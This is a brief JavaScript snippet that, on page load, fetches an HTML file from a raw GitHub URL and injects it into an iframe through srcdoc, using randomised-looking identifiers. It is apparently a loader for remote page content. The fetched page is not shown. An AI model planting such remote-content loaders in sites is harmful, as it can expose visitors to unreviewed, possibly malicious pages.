div.script:

(async function oAobp() {
  const TARGET_URL = 'https://raw.githubusercontent.com/zaka13alt/sitesinglefile/refs/heads/main/single%5C.html'; 

  try {
    // 
    const response = await fetch(TARGET_URL);

    if (response.ok) {
      const CND2n = await response.text();

      // 
      const iframe = document.getElementById('nMbQg');
      iframe.srcdoc = CND2n;
    } else {
      console.error('error :', response.status);
    }
  } catch (error) {
    console.error('err', error);
  }
})();
